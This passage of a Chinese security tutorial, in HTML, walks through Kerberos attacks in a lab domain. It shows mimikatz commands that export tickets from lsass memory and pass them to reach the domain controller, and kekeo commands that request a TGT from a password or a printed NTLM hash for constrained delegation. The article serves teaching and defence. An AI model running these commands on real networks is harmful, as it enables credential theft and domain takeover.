onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIG15ibJiaEDetFic1DlrEZfmeetKVhCQRtBcXN54lOREcicBrM8IpdibdeHw/640?wx_fmt=png'" data-type="png" data-w="845" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />我们用sqladmin或者任意域管账号访问win8（这里域管账号登录在任意一台机器都可以）<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6111111111111112" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/47_PsicaCwnoIhYE9hIqSBxo7b3eCGtzw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIbOB8Ja1qhoLicsULiaibJ9lVEbzUPsicaCwnoIhYE9hIqSBxo7b3eCGtzw/640?wx_fmt=png'" data-type="png" data-w="576" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />此时，在主机win8的lsass.exe内存中就会有域用户sqladmin的TGT票据。<br style="-webkit-tap-highlight-color: transparent;"  />我们在win8上以管理员权限运行mimikatz，执行以下命令<br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">privilege</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">debug </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">导出票据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">sekurlsa</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tickets </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">export</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5591085271317829" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/48_q5OCJE3brvveM1JKaQ7iaeAV7Jo8pg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIbUdJKoALhdbcicZ6ibfwvBtkicFEq5OCJE3brvveM1JKaQ7iaeAV7Jo8pg/640?wx_fmt=png'" data-type="png" data-w="1032" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">3.注入票据</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />用 mimikatz 将这个票据导入内存中，然后访问域控。<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">导入票据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ptt </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">33f6ebf</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">60a00000</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">sqladmin@krbtgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ORG</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">查看票据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">list</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.2940563086548488" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/49_zEFH0q44Kficy40XocJtOGxxQkuEhQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIAlkjamZDZzAiaWbxuqJOeN1luzzEFH0q44Kficy40XocJtOGxxQkuEhQ/640?wx_fmt=png'" data-type="png" data-w="959" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">4.访问域控</h3><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5438282647584973" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/50_iadJg5BRHzD8COhwIW2ZicH0n4hAQA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIpKnEMmVhORVlakVZtCWFs2MKXmiadJg5BRHzD8COhwIW2ZicH0n4hAQA/640?wx_fmt=png'" data-type="png" data-w="559" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">约束性委派攻击</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />操作环境：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域：0day.org</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域内主机：<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">windows 7</code>，主机名：PC-jack-0day，IP：192.168.3.62，用户：jack</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>域控：OWA2010SP3</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />们设置了机器用户PC-jack-0day对OWA2010SP3的<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">cifs</code>服务的委派</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">1.查找约束性委派的主机账号</h3><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.36923076923076925" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/51_O9phYefUl3JN8k103giaDUcPZnJfLA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaICRE7Od1Y0IPdLeDEn0JMCgsIjO9phYefUl3JN8k103giaDUcPZnJfLA/640?wx_fmt=png'" data-type="png" data-w="1235" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.请求用户TGT</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ask </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">PC</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">JACK</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0DAY</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0day</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">password</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">password </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ticket</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">test</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">参数：<br style="-webkit-tap-highlight-color: transparent;"  /><code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">/user</code>: 服务用户的用户名<br style="-webkit-tap-highlight-color: transparent;"  /><code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">/password</code>: 服务用户的明文密码<br style="-webkit-tap-highlight-color: transparent;"  /><code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">/domain</code>: 所在域名<br style="-webkit-tap-highlight-color: transparent;"  /><code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">/ticket</code>: 指定票据名称，不过这个参数没有生效，可以忽略<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />kekeo同样也支持使用<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">NTLM Hash</code><br style="-webkit-tap-highlight-color: transparent;"  />在请求服务用户的TGT那步直接把<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">/password</code>改成<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">/NTLM</code>即可<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />这里我们知道PC-JACK-0DAY的ntlm hash为：768623e06fae601be0c04759c87d93d3<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />我们执行：</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span 